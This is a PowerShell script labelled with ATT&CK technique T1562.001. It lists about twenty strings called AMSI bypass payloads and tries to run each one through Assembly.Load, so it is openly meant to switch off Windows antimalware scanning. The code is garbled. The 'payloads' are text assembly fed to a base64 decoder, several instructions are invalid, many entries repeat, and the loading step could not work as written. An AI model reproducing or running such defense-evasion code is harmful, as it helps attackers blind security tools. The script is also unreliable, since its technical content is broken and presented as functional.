# T1562.001 - Impair Defenses: Disable or Modify Tools

# AMSI bypass payloads
$amsiBypassPayloads = @(
"xor eax,eax;push eax;popf;mov eax,0x7FFE0300;mov dword ptr [eax],0xE5894855;mov dword ptr [eax+4],0xEC8348;mov dword ptr [eax+8],0xFFE0;retf",
"xor ecx,ecx;mov al,0xE9;mov cx,0x600;mov dx,0x7FFE0300;mov [dx],cx;mov [dx+2],al;retf",
"mov eax,0x7FFE0300;mov byte ptr [eax],0xEB;mov byte ptr [eax+1],0x08;mov byte ptr [eax+2],0x90;mov byte ptr [eax+3],0x90;mov byte ptr [eax+4],0x90;mov byte ptr [eax+5],0x90;mov byte ptr [eax+6],0x90;mov byte ptr [eax+7],0x90;mov byte ptr [eax+8],0x90;mov byte ptr [eax+9],0x90;mov byte ptr [eax+10],0x58;retf",
"mov edi,edi;mov edi,0x7FFE0300;mov byte ptr [edi],0xEB;mov byte ptr [edi+1],0x08;mov byte ptr [edi+2],0x90;mov byte ptr [edi+3],0x90;mov byte ptr [edi+4],0x90;mov byte ptr [edi+5],0x90;mov byte ptr [edi+6],0x90;mov byte ptr [edi+7],0x90;mov byte ptr [edi+8],0x90;mov byte ptr [edi+9],0x90;mov byte ptr [edi+10],0x58;retf",
"mov edx,0x7FFE0300;mov byte ptr [edx],0xEB;mov byte ptr [edx+1],0x08;mov byte ptr [edx+2],0x90;mov byte ptr [edx+3],0x90;mov byte ptr [edx+4],0x90;mov byte ptr [edx+5],0x90;mov byte ptr [edx+6],0x90;mov byte ptr [edx+7],0x90;mov byte ptr [edx+8],0x90;mov byte ptr [edx+9],0x90;mov byte ptr [edx+10],0x58;retf",
"xor eax,eax;push eax;popf;mov eax,0x7FFE0300;mov byte ptr [eax],0xEB;mov byte ptr [eax+1],0x08;mov byte ptr [eax+2],0x90;mov byte ptr [eax+3],0x90;mov byte ptr [eax+4],0x90;mov byte ptr [eax+5],0x90;mov byte ptr [eax+6],0x90;mov byte ptr [eax+7],0x90;mov byte ptr [eax+8],0x90;mov byte ptr [eax+9],0x90;mov byte ptr [eax+10],0x58;retf",
"mov edi,0x7FFE0300;mov byte ptr [edi],0xEB;mov byte ptr [edi+1],0x08;mov byte ptr [edi+2],0x90;mov byte ptr [edi+3],0x90;mov byte ptr [edi+4],0x90;mov byte ptr [edi+5],0x90;mov byte ptr [edi+6],0x90;mov byte ptr [edi+7],0x90;mov byte ptr [edi+8],0x90;mov byte ptr [edi+9],0x90;mov byte ptr [edi+10],0x58;retf",
"xor edx,edx;mov al,0xE9;mov dx,0x600;mov [0x7FFE0300],dx;mov [0x7FFE0300+2],al;retf",
"mov ebx,0x7FFE0300;mov al,0xEB;mov bl,0x08;mov [ebx],bl;mov [ebx+1],al;mov [ebx+2],0x90;mov [ebx+3],0x90;mov [ebx+4],0x90;mov [ebx+5],0x90;mov [ebx+6],0x90;mov [ebx+7],0x90;mov [ebx+8],0x90;mov [ebx+9],0x90;mov [ebx+10],0x58;retf",
"mov eax,0x7FFE0300;mov byte ptr [eax],0xEB;mov byte ptr [eax+1],0x08;mov byte ptr [eax+2],0x90;mov byte ptr [eax+3],0x90;mov byte ptr [eax+4],0x90;mov byte ptr [eax+5],0x90;mov byte ptr [eax+6],0x90;mov byte ptr [eax+7],0x90;mov byte ptr [eax+8],0x90;mov byte ptr [eax+9],0x90;mov byte ptr [eax+10],0x58;retf 0x7FFE0300",
"mov ecx,0x7FFE0300;mov byte ptr [ecx],0xEB;mov byte ptr [ecx+1],0x08;mov byte ptr [ecx+2],0x90;mov byte ptr [ecx+3],0x90;mov byte ptr [ecx+4],0x90;mov byte ptr [ecx+5],0x90;mov byte ptr [ecx+6],0x90;mov byte ptr [ecx+7],0x90;mov byte ptr [ecx+8],0x90;mov byte ptr [ecx+9],0x90;mov byte ptr [ecx+10],0x58;retf",
"mov eax,0x7FFE0300;mov byte ptr [eax],0xEB;mov byte ptr [eax+1],0x08;mov byte ptr [eax+2],0x90;mov byte ptr [eax+3],0x90;mov byte ptr [eax+4],0x90;mov byte ptr [eax+5],0x90;mov byte ptr [eax+6],0x90;mov byte ptr [eax+7],0x90;mov byte ptr [eax+8],0x90;mov byte ptr [eax+9],0x90;mov byte ptr [eax+10],0x58;retf 0x7FFE0300",
"xor edx,edx;mov al,0xE9;mov dx,0x600;mov [0x7FFE0300],dx;mov [0x7FFE0300+2],al;retf 0x7FFE0300",
"mov edi,0x7FFE0300;mov eax,0x90;mov edx,0x600;mov [edi],edx;mov [edi+2],al;retf",
"xor edx,edx;mov al,0xE9;mov dx,0x600;mov [0x7FFE0300],dx;mov [0x7FFE0300+2],al;retf 0x7FFE0300",
"mov eax,0x7FFE0300;mov byte ptr [eax],0xEB;mov byte ptr [eax+1],0x08;mov byte ptr [eax+2],0x90;mov byte ptr [eax+3],0x90;mov byte ptr [eax+4],0x90;mov byte ptr [eax+5],0x90;mov byte ptr [eax+6],0x90;mov byte ptr [eax+7],0x90;mov byte ptr [eax+8],0x90;mov byte ptr [eax+9],0x90;mov byte ptr [eax+10],0x58;retf",
"xor eax,eax;push eax;popf;mov eax,0x7FFE0300;mov byte ptr [eax],0xEB;mov byte ptr [eax+1],0x08;mov byte ptr [eax+2],0x90;mov byte ptr [eax+3],0x90;mov byte ptr [eax+4],0x90;mov byte ptr [eax+5],0x90;mov byte ptr [eax+6],0x90;mov byte ptr [eax+7],0x90;mov byte ptr [eax+8],0x90;mov byte ptr [eax+9],0x90;mov byte ptr [eax+10],0x58;retf 0x7FFE0300",
"mov edx,0x7FFE0300;mov al,0xEB;mov dl,0x08;mov [edx],dl;mov [edx+1],al;mov [edx+2],0x90;mov [edx+3],0x90;mov [edx+4],0x90;mov [edx+5],0x90;mov [edx+6],0x90;mov [edx+7],0x90;mov [edx+8],0x90;mov [edx+9],0x90;mov [edx+10],0x58;retf 0x7FFE0300",
"xor eax,eax;push eax;popf;mov eax,0x7FFE0300;mov al,0xEB;mov [eax],al;mov [eax+1],0x08;mov [eax+2],0x90;mov [eax+3],0x90;mov [eax+4],0x90;mov [eax+5],0x90;mov [eax+6],0x90;mov [eax+7],0x90;mov [eax+8],0x90;mov [eax+9],0x90;mov [eax+10],0x58;retf",
"mov edi,0x7FFE0300;mov byte ptr [edi],0xEB;mov byte ptr [edi+1],0x08;mov byte ptr [edi+2],0x90;mov byte ptr [edi+3],0x90;mov byte ptr [edi+4],0x90;mov byte ptr [edi+5],0x90;mov byte ptr [edi+6],0x90;mov byte ptr [edi+7],0x90;mov byte ptr [edi+8],0x90;mov byte ptr [edi+9],0x90;mov byte ptr [edi+10],0x58;retf 0x7FFE0300"
)

# Execute all the payloads
 $amsiBypassPayloads | Foreach-Object {
    [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($_))
}
